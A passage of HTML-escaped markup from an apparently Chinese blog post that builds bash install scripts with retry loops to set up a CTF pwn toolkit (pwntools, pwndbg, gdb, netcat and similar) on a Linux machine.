class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Failed to install pwntools after &lt;span class=&#34;variable&#34;&gt;$MAX_RETRIES&lt;/span&gt; attempts.&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MAX_RETRIES=3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;INSTALL_SUCCESS=&lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RETRY_COUNT=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装pwndbg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;另外一种方式&#34;&gt;&lt;a href=&#34;#另外一种方式&#34; class=&#34;headerlink&#34; title=&#34;另外一种方式&#34;&gt;&lt;/a&gt;另外一种方式&lt;/h2&gt;&lt;p&gt;​		只需要定义一个变量, 而且代码量少了很多&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 定义变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MAX_RETRY=3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 更新apt源&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; sudo apt update; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;更新apt源时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;更新apt源失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装常用工具&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; xxxxxxxxxxx; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装常用工具时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装常用工具失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;定好模版&#34;&gt;&lt;a href=&#34;#定好模版&#34; class=&#34;headerlink&#34; title=&#34;定好模版&#34;&gt;&lt;/a&gt;定好模版&lt;/h2&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 定义变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MAX_RETRY=3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装常用工具&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; xxxxxxxxxxx; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装常用工具时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装常用工具失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;套上&#34;&gt;&lt;a href=&#34;#套上&#34; class=&#34;headerlink&#34; title=&#34;套上!&#34;&gt;&lt;/a&gt;套上!&lt;/h2&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;mkdir&lt;/span&gt; /ctfpwntools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; /ctfpwntools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 定义变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MAX_RETRY=3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 必要的更新、安装常用工具&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (apt-get update;apt-get -y install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential git vim gdb strace ltrace  socat netcat); &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span 